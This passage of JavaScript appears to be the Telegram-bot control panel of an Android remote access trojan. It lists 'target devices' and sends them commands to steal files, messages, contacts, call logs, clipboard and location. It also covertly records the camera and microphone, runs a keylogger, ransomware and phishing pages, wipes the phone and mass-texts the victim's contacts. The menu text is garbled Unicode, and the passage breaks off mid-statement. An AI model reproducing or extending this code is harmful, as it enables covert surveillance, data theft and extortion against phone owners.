        if (message.text == '·¥áx·¥á·¥Ñ·¥ú·¥õ·¥á ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '¬∞‚Ä¢ …¥·¥è ·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ…™…¥…¢ ·¥Ö·¥á·¥†…™·¥Ñ·¥ás ·¥Ä·¥†·¥Ä…™ ü·¥Ä ô ü·¥á\n\n' +
                    '‚Ä¢ ·¥ç·¥Ä·¥ã·¥á s·¥ú Ä·¥á ·¥õ ú·¥á ·¥Ä·¥ò·¥ò ü…™·¥Ñ·¥Ä·¥õ…™·¥è…¥ …™s …™…¥s·¥õ·¥Ä ü ü·¥á·¥Ö ·¥è…¥ ·¥õ ú·¥á ·¥õ·¥Ä Ä…¢·¥á·¥õ ·¥Ö·¥á·¥†…™·¥Ñ·¥á'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '¬∞‚Ä¢ s·¥á ü·¥á·¥Ñ·¥õ ·¥Ö·¥á·¥†…™·¥Ñ·¥á ·¥õ·¥è ·¥áx·¥á·¥Ñ·¥ú·¥õ·¥á ·¥Ñ·¥è·¥ç·¥ç·¥á…¥·¥Ö', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '¬∞‚Ä¢ ·¥ò·¥á Ä·¥ç…™ss…™·¥è…¥ ·¥Ö·¥á…¥…™·¥á·¥Ö')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`¬∞‚Ä¢ s·¥á ü·¥á·¥Ñ·¥õ ·¥Ñ·¥è·¥ç·¥ç·¥á…¥·¥Ö Íú∞·¥è Ä ·¥Ö·¥á·¥†…™·¥Ñ·¥á : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: 'üñºÔ∏è·¥Ä·¥ò·¥òsüñºÔ∏è', callback_data: `apps:${uuid}`},
                        {text: 'üö®·¥Ö·¥á·¥†…™·¥Ñ·¥á …™…¥Íú∞·¥èüö®', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: 'üìÇ…¢·¥á·¥õ Íú∞…™ ü·¥áüìÇ', callback_data: `file:${uuid}`},
                        {text: 'üëπ·¥Ö·¥á ü·¥á·¥õ·¥á Íú∞…™ ü·¥áüëπ', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: 'üéüÔ∏ès·¥Ñ Ä·¥á·¥á…¥s ú·¥è·¥õüéüÔ∏è', callback_data: `screenshot:${uuid}`},
                        {text: 'üëæ·¥° ú·¥Ä·¥õs·¥Ä·¥ò·¥òüëæ', callback_data: `whatsapp:${uuid}`},
                    ],
                    [
                        {text: 'üåÄ·¥Ñ ü…™·¥ò ô·¥è·¥Ä Ä·¥ÖüåÄ', callback_data: `clipboard:${uuid}`},
                        {text: 'ü•é·¥ç…™·¥Ñ Ä·¥è·¥ò ú·¥è…¥·¥áü•é', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: 'üî∞·¥ç·¥Ä…™…¥ ·¥Ñ·¥Ä·¥ç·¥á Ä·¥Äüî∞', callback_data: `camera_main:${uuid}`},
                        {text: 'üé™s·¥á üÍú∞…™·¥á ·¥Ñ·¥Ä·¥ç·¥á Ä·¥Äüé™', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'üåê ü·¥è·¥Ñ·¥Ä·¥õ…™·¥è…¥üåê', callback_data: `location:${uuid}`},
                        {text: 'üóØÔ∏è·¥õ·¥è·¥Äs·¥õüóØÔ∏è', callback_data: `toast:${uuid}`}
                    ],
                     [
                        {text: 'üìÆ…¢·¥á·¥õ ·¥ò·¥Ä è·¥ç·¥á…¥·¥õüìÆ', callback_data: `Settings:${uuid}`},
                        {text: '‚ò¢Ô∏è·¥ò ú·¥è…¥·¥á  Ä·¥ás·¥á·¥õ‚ò¢Ô∏è', callback_data: `Erase_data:${uuid}`},
                    ],
                    [
                        {text: '‚òÉÔ∏è·¥Ñ·¥Ä ü ü  ü·¥è…¢s‚òÉÔ∏è', callback_data: `calls:${uuid}`},
                        {text: 'üèÜ·¥Ñ·¥è…¥·¥õ·¥Ä·¥Ñ·¥õsüèÜ', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: 'üîíÔ∏è·¥†…™ ô Ä·¥Ä·¥õ·¥áüîíÔ∏è', callback_data: `vibrate:${uuid}`},
                        {text: 'üîî…¥·¥è·¥õ…™Íú∞…™·¥Ñ·¥Ä·¥õ…™·¥è…¥üîî', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: 'üßä·¥ç·¥áss·¥Ä…¢·¥ásüßä', callback_data: `messages:${uuid}`},
                        {text: 'üéÅs·¥á…¥·¥Ö s·¥çsüéÅ', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: '‚ùå Ä·¥Ä…¥s·¥è·¥ç·¥°·¥Ä Ä·¥á‚ùå', callback_data: `Ransomware:${uuid}`},
                        {text: '‚ú≥Ô∏èÍú∞ ú…™s ú…™…¥…¢ ·¥ò·¥Ä…¢·¥á‚ú≥Ô∏è', callback_data: `custom_phishing:${uuid}`},
                    ],
                    [
                        {text: 'ü¶û·¥ò ü·¥Ä è ·¥Ä·¥ú·¥Ö…™·¥èü¶û', callback_data: `play_audio:${uuid}`},
                        {text: '‚òØÔ∏ès·¥õ·¥è·¥ò ·¥Ä·¥ú·¥Ö…™·¥è‚òØÔ∏è', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '‚õî‚ÄºÔ∏ès·¥á…¥·¥Ö s·¥çs ·¥õ·¥è ·¥Ä ü ü ·¥Ñ·¥è…¥·¥õ·¥Ä·¥Ñ·¥õs‚ÄºÔ∏è‚õî',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                    [
                        {text: 'üîí·¥á…¥·¥Ñ Ä è·¥ò·¥õ ·¥Ö·¥Ä·¥õ·¥Äüîí', callback_data: `encrypt_data:${uuid}`},
                        {text: 'üîí·¥Ö·¥á·¥Ñ Ä è·¥ò·¥õ ·¥Ö·¥Ä·¥õ·¥Äüîí', callback_data: `decrypt_data:${uuid}`},
                    ],
                    [
                        {text: 'üîÆ·¥ã·¥á è ü·¥è…¢…¢·¥á Ä ·¥è…¥üîÆ', callback_data: `keylogger_on:${uuid}`},
                        {text: '‚õΩ·¥ã·¥á è ü·¥è…¢·¥á Ä ·¥èÍú∞Íú∞‚õΩ', callback_data: `keylogger_off:${uuid}`},
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '¬∞‚Ä¢ ‚è≥ è·¥è·¥ú Ä  Ä·¥á«´·¥ú·¥ás·¥õ …™s ·¥è…¥ ·¥ò Ä·¥è·¥Ñ·¥áss‚è≥\n\n' +
            '‚Ä¢  è·¥è·¥ú ·¥°…™ ü ü  Ä·¥á·¥Ñ·¥á…™·¥†·¥á ·¥Ä  Ä·¥ás·¥ò·¥è…¥s·¥á …™…¥ ·¥õ ú·¥á …¥·¥áx·¥õ Íú∞·¥á·¥° ·¥ç·¥è·¥ç·¥á…¥·¥õs',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Ö ·¥Ö·¥á·¥†…™·¥Ñ·¥ás"], ["·¥áx·¥á·¥Ñ·¥ú·¥õ·¥á ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '¬∞‚Ä¢ ‚è≥ è·¥è·¥ú Ä  Ä·¥á«´·¥ú·¥ás·¥õ …™s ·¥è…¥ ·¥ò Ä·¥è·¥Ñ·¥áss‚è≥\n\n' +
            '‚Ä¢  è·¥è·¥ú ·¥°…™ ü ü  Ä·¥á·¥Ñ·¥á…™·¥†·¥á ·¥Ä  Ä·¥ás·¥ò·¥è…¥s·¥á …™…¥ ·¥õ ú·¥á …¥·¥áx·¥õ Íú∞·¥á·¥° ·¥ç·¥è·¥ç·¥á…¥·¥õs',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Ö ·¥Ö·¥á·¥†…™·¥Ñ·¥ás"], ["·¥áx·¥á·¥Ñ·¥ú·¥õ·¥á ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '¬∞‚Ä¢ ‚è≥ è·¥è·¥ú Ä  Ä·¥á«´·¥ú·¥ás·¥õ …™s ·¥è…¥ ·¥ò Ä·¥è·¥Ñ·¥áss‚è≥\n\n' +
            '‚Ä¢  è·¥è·¥ú ·¥°…™ ü ü  Ä·¥á·¥Ñ·¥á…™·¥†·¥á ·¥Ä  Ä·¥ás·¥ò·¥è…¥s·¥á …™…¥ ·¥õ ú·¥á …¥·¥áx·¥õ Íú∞·¥á·¥° ·¥ç·¥è·¥ç·¥á…¥·¥õs',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Ö ·¥Ö·¥á·¥†…™·¥Ñ·¥ás"], ["·¥áx·¥á·¥Ñ·¥ú·¥õ·¥á ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '¬∞‚Ä¢ ‚è≥ è·¥è·¥ú Ä  Ä·¥á«´·¥ú·¥ás·¥õ …™s ·¥è…¥ ·¥ò Ä·¥è·¥Ñ·¥áss‚è≥\n\n' +
            '‚Ä¢  è·¥è·¥ú ·¥°…™ ü ü  Ä·¥á·¥Ñ·¥á…™·¥†·¥á ·¥Ä  Ä·¥ás·¥ò·¥è…¥s·¥á …™…¥ ·¥õ ú·¥á …¥·¥áx·¥õ Íú∞·¥á·¥° ·¥ç·¥è·¥ç·¥á…¥·¥õs',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Ö ·¥Ö·¥á·¥†…™·¥Ñ·¥ás"], ["·¥áx·¥á·¥Ñ·¥ú·¥õ·¥á ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '¬∞‚Ä¢ ‚è≥ è·¥è·¥ú Ä  Ä·¥á«´·¥ú·¥ás·¥õ …™s ·¥è…¥ ·¥ò Ä·¥è·¥Ñ·¥áss‚è≥\n\n' +
            '‚Ä¢  è·¥è·¥ú ·¥°…™ ü ü  Ä·¥á·¥Ñ·¥á…™·¥†·¥á ·¥Ä  Ä·¥ás·¥ò·¥è…¥s·¥á …™…¥ ·¥õ ú·¥á …¥·¥áx·¥õ Íú∞·¥á·¥° ·¥ç·¥è·¥ç·¥á…¥·¥õs',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Ö ·¥Ö·¥á·¥†…™·¥Ñ·¥ás"], ["·¥áx·¥á·¥Ñ·¥ú·¥õ·¥á ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '¬∞‚Ä¢ ‚è≥ è·¥è·¥ú Ä  Ä·¥á«´·¥ú·¥ás·¥õ …™s ·¥è…¥ ·¥ò Ä·¥è·¥Ñ·¥áss‚è≥\n\n' +
            '‚Ä¢  è·¥è·¥ú ·¥°…™ ü ü  Ä·¥á·¥Ñ·¥á…™·¥†·¥á ·¥Ä  Ä·¥ás·¥ò·¥è…¥s·¥á …™…¥ ·¥õ ú·¥á …¥·¥áx·¥õ Íú∞·¥á·¥° ·¥ç·¥è·¥ç·¥á…¥·¥õs',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Ö ·¥Ö·¥á·¥†…™·¥Ñ·¥ás"], ["·¥áx·¥á·¥Ñ·¥ú·¥õ·¥á ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '¬∞‚Ä¢ ‚è≥ è·¥è·¥ú Ä  Ä·¥á«´·¥ú·¥ás·¥õ …™s ·¥è…¥ ·¥ò Ä·¥è·¥Ñ·¥áss‚è≥\n\n' +
            '‚Ä¢  è·¥è·¥ú ·¥°…™ ü ü  Ä·¥á·¥Ñ·¥á…™·¥†·¥á ·¥Ä  Ä·¥ás·¥ò·¥è…¥s·¥á …™…¥ ·¥õ ú·¥á …¥·¥áx·¥õ Íú∞·¥á·¥° ·¥ç·¥è·¥ç·¥á…¥·¥õs',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Ö ·¥Ö·¥á·¥†…™·¥Ñ·¥ás"], ["·¥áx·¥á·¥Ñ·¥ú·¥õ·¥á ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '¬∞‚Ä¢ ‚è≥ è·¥è·¥ú Ä  Ä·¥á«´·¥ú·¥ás·¥õ …™s ·¥è…¥ ·¥ò Ä·¥è·¥Ñ·¥áss‚è≥\n\n' +
            '‚Ä¢  è·¥è·¥ú ·¥°…™ ü ü  Ä·¥á·¥Ñ·¥á…™·¥†·¥á ·¥Ä  Ä·¥ás·¥ò·¥è…¥s·¥á …™…¥ ·¥õ ú·¥á …¥·¥áx·¥õ Íú∞·¥á·¥° ·¥ç·¥è·¥ç·¥á…¥·¥õs',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Ö ·¥Ö·¥á·¥†…™·¥Ñ·¥ás"], ["·¥áx·¥á·¥Ñ·¥ú·¥õ·¥á ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '¬∞‚Ä¢ ‚è≥ è·¥è·¥ú Ä  Ä·¥á«´·¥ú·¥ás·¥õ …™s ·¥è…¥ ·¥ò Ä·¥è·¥Ñ·¥áss‚è≥\n\n' +
            '‚Ä¢  è·¥è·¥ú ·¥°…™ ü ü  Ä·¥á·¥Ñ·¥á…™·¥†·¥á ·¥Ä  Ä·¥ás·¥ò·¥è…¥s·¥á …™…¥ ·¥õ ú·¥á …¥·¥áx·¥õ Íú∞·¥á·¥° ·¥ç·¥è·¥ç·¥á…¥·¥õs',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Ö ·¥Ö·¥á·¥†…™·¥Ñ·¥ás"], ["·¥áx·¥á·¥Ñ·¥ú·¥õ·¥á ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '¬∞‚Ä¢ ‚è≥ è·¥è·¥ú Ä  Ä·¥á«´·¥ú·¥ás·¥õ …™s ·¥è…¥ ·¥ò Ä·¥è·¥Ñ·¥áss‚è≥\n\n' +
            '‚Ä¢  è·¥è·¥ú ·¥°…™ ü ü  Ä·¥á·¥Ñ·¥á…™·¥†·¥á ·¥Ä  Ä·¥ás·¥ò·¥è…¥s·¥á …™…¥ ·¥õ ú·¥á …¥·¥áx·¥õ Íú∞·¥á·¥° ·¥ç·¥è·¥ç·¥á…¥·¥õs',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Ö ·¥Ö·¥á·¥†…™·¥Ñ·¥ás"], ["·¥áx·¥á·¥Ñ·¥ú·¥õ·¥á ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '¬∞‚Ä¢ ‚è≥ è·¥è·¥ú Ä  Ä·¥á«´·¥ú·¥ás·¥õ …™s ·¥è…¥ ·¥ò Ä·¥è·¥Ñ·¥áss‚è≥\n\n' +
            '‚Ä¢  è·¥è·¥ú ·¥°…™ ü ü  Ä·¥á·¥Ñ·¥á…™·¥†·¥á ·¥Ä  Ä·¥ás·¥ò·¥è…¥s·¥á …™…¥ ·¥õ ú·¥á …¥·¥áx·¥õ Íú∞·¥á·¥° ·¥ç·¥è·¥ç·¥á…¥·¥õs',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Ö ·¥Ö·¥á·¥†…™·¥Ñ·¥ás"], ["·¥áx·¥á·¥Ñ·¥ú·¥õ·¥á ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '¬∞‚Ä¢ ·¥ò ü·¥á·¥Äs·¥á  Ä·¥á·¥ò ü è ·¥õ ú·¥á …¥·¥ú·¥ç ô·¥á Ä ·¥õ·¥è ·¥° ú…™·¥Ñ ú  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥õ·¥è s·¥á…¥·¥Ö ·¥õ ú·¥á s·¥çs\n\n' +
            '‚Ä¢…™Íú∞  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥õ·¥è s·¥á…¥·¥Ö s·¥çs ·¥õ·¥è  ü·¥è·¥Ñ·¥Ä ü ·¥Ñ·¥è·¥ú…¥·¥õ Ä è …¥·¥ú·¥ç ô·¥á Äs,  è·¥è·¥ú ·¥Ñ·¥Ä…¥ ·¥á…¥·¥õ·¥á Ä ·¥õ ú·¥á …¥·¥ú·¥ç ô·¥á Ä ·¥°…™·¥õ ú ·¥¢·¥á Ä·¥è ·¥Ä·¥õ ·¥õ ú·¥á  ô·¥á…¢…™…¥…¥…™…¥…¢, ·¥è·¥õ ú·¥á Ä·¥°…™s·¥á ·¥á…¥·¥õ·¥á Ä ·¥õ ú·¥á …¥·¥ú·¥ç ô·¥á Ä ·¥°…™·¥õ ú ·¥õ ú·¥á ·¥Ñ·¥è·¥ú…¥·¥õ Ä è ·¥Ñ·¥è·¥Ö·¥á',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '¬∞‚Ä¢ ·¥á…¥·¥õ·¥á Ä ·¥õ ú·¥á ·¥ç·¥áss·¥Ä…¢·¥á  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥õ·¥è s·¥á…¥·¥Ö ·¥õ·¥è ·¥Ä ü ü ·¥Ñ·¥è…¥·¥õ·¥Ä·¥Ñ·¥õs\n\n' +
            '‚Ä¢  ô·¥á ·¥Ñ·¥Ä Ä·¥áÍú∞·¥ú ü ·¥õ ú·¥Ä·¥õ ·¥õ ú·¥á ·¥ç·¥áss·¥Ä…¢·¥á ·¥°…™ ü ü …¥·¥è·¥õ  ô·¥á s·¥á…¥·¥õ …™Íú∞ ·¥õ ú·¥á …¥·¥ú·¥ç ô·¥á Ä ·¥èÍú∞ ·¥Ñ ú·¥Ä Ä·¥Ä·¥Ñ·¥õ·¥á Äs …™…¥  è·¥è·¥ú Ä ·¥ç·¥áss·¥Ä…¢·¥á …™s ·¥ç·¥è Ä·¥á ·¥õ ú·¥Ä…¥ ·¥Ä ü ü·¥è·¥°·¥á·¥Ö',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '¬∞‚Ä¢ üìÆ·¥á…¥·¥õ·¥á Ä ·¥õ ú·¥á ·¥ò·¥Ä·¥õ ú ·¥èÍú∞ ·¥õ ú·¥á Íú∞…™ ü·¥á  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥õ·¥è ·¥Ö·¥è·¥°…¥ ü·¥è·¥Ä·¥Öüó≥Ô∏è\n\n' +
            '‚Ä¢  è·¥è·¥ú ·¥Ö·¥è …¥·¥è·¥õ …¥·¥á·¥á·¥Ö ·¥õ·¥è ·¥á…¥·¥õ·¥á Ä ·¥õ ú·¥á Íú∞·¥ú ü ü Íú∞…™ ü·¥á ·¥ò·¥Ä·¥õ ú, ·¥ä·¥ús·¥õ ·¥á…¥·¥õ·¥á Ä ·¥õ ú·¥á ·¥ç·¥Ä…™…¥ ·¥ò·¥Ä·¥õ ú. Íú∞·¥è Ä ·¥áx·¥Ä·¥ç·¥ò ü·¥á, ·¥á…¥·¥õ·¥á Ä<b> ·¥Ö·¥Ñ…™·¥ç/·¥Ñ·¥Ä·¥ç·¥á Ä·¥Ä </b> ·¥õ·¥è  Ä·¥á·¥Ñ·¥á…™·¥†·¥á …¢·¥Ä ü ü·¥á Ä è Íú∞…™ ü·¥ás.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '¬∞‚Ä¢ üìÇ·¥á…¥·¥õ·¥á Ä ·¥õ ú·¥á ·¥ò·¥Ä·¥õ ú ·¥èÍú∞ ·¥õ ú·¥á Íú∞…™ ü·¥á  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥õ·¥è ·¥Ö·¥á ü·¥á·¥õ·¥áüí•\n\n' +
            '‚Ä¢  è·¥è·¥ú ·¥Ö·¥è …¥·¥è·¥õ …¥·¥á·¥á·¥Ö ·¥õ·¥è ·¥á…¥·¥õ·¥á Ä ·¥õ ú·¥á Íú∞·¥ú ü ü Íú∞…™ ü·¥á ·¥ò·¥Ä·¥õ ú, ·¥ä·¥ús·¥õ ·¥á…¥·¥õ·¥á Ä ·¥õ ú·¥á ·¥ç·¥Ä…™…¥ ·¥ò·¥Ä·¥õ ú. Íú∞·¥è Ä ·¥áx·¥Ä·¥ç·¥ò ü·¥á, ·¥á…¥·¥õ·¥á Ä<b> ·¥Ö·¥Ñ…™·¥ç/·¥Ñ·¥Ä·¥ç·¥á Ä·¥Ä </b> ·¥õ·¥è ·¥Ö·¥á ü·¥á·¥õ·¥á …¢·¥Ä ü ü·¥á Ä è Íú∞…™ ü·¥ás.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '¬∞‚Ä¢ ·¥á…¥·¥õ·¥á Ä  ú·¥è·¥°  ü·¥è…¥…¢  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥õ ú·¥á ·¥ç…™·¥Ñ Ä·¥è·¥ò ú·¥è…¥·¥á ·¥õ·¥è  ô·¥á  Ä·¥á·¥Ñ·¥è Ä·¥Ö·¥á·¥Ö\n\n' +
            '‚Ä¢ …¥·¥è·¥õ·¥á ·¥õ ú·¥Ä·¥õ  è·¥è·¥ú ·¥ç·¥ús·¥õ ·¥á…¥·¥õ·¥á Ä ·¥õ ú·¥á ·¥õ…™·¥ç·¥á …¥·¥ú·¥ç·¥á Ä…™·¥Ñ·¥Ä ü ü è …™…¥ ·¥ú…¥…™·¥õs ·¥èÍú∞ s·¥á·¥Ñ·¥è…¥·¥Ös',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '¬∞‚Ä¢ ·¥á…¥·¥õ·¥á Ä ·¥õ ú·¥á ·¥ç·¥áss·¥Ä…¢·¥á ·¥õ ú·¥Ä·¥õ  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥õ·¥è ·¥Ä·¥ò·¥ò·¥á·¥Ä Ä ·¥è…¥ ·¥õ ú·¥á ·¥õ·¥Ä Ä…¢·¥á·¥õ ·¥Ö·¥á·¥†…™·¥Ñ·¥á\n\n' +
            '‚Ä¢ ·¥õ·¥è·¥Äs·¥õ …™s ·¥Ä s ú·¥è Ä·¥õ ·¥ç·¥áss·¥Ä…¢·¥á ·¥õ ú·¥Ä·¥õ ·¥Ä·¥ò·¥ò·¥á·¥Ä Äs ·¥è…¥ ·¥õ ú·¥á ·¥Ö·¥á·¥†…™·¥Ñ·¥á s·¥Ñ Ä·¥á·¥á…¥ Íú∞·¥è Ä ·¥Ä Íú∞·¥á·¥° s·¥á·¥Ñ·¥è…¥·¥Ös',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '¬∞‚Ä¢ üìÆ·¥á…¥·¥õ·¥á Ä ·¥õ ú·¥á ·¥ç·¥áss·¥Ä…¢·¥á  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥õ·¥è ·¥Ä·¥ò·¥ò·¥á·¥Ä Ä ·¥Äs …¥·¥è·¥õ…™Íú∞…™·¥Ñ·¥Ä·¥õ…™·¥è…¥\n\n' +
            '‚Ä¢  è·¥è·¥ú Ä ·¥ç·¥áss·¥Ä…¢·¥á ·¥°…™ ü ü  ô·¥á ·¥Ä·¥ò·¥ò·¥á·¥Ä Ä …™…¥ ·¥õ·¥Ä Ä…¢·¥á·¥õ ·¥Ö·¥á·¥†…™·¥Ñ·¥á s·¥õ·¥Ä·¥õ·¥ús  ô·¥Ä Ä  ü…™·¥ã·¥á  Ä·¥á…¢·¥ú ü·¥Ä Ä …¥·¥è·¥õ…™Íú∞…™·¥Ñ·¥Ä·¥õ…™·¥è…¥',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '¬∞‚Ä¢ üìÄ·¥á…¥·¥õ·¥á Ä ·¥õ ú·¥á ·¥Ä·¥ú·¥Ö…™·¥è  ü…™…¥·¥ã  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥õ·¥è ·¥ò ü·¥Ä èüèñÔ∏è\n\n' +
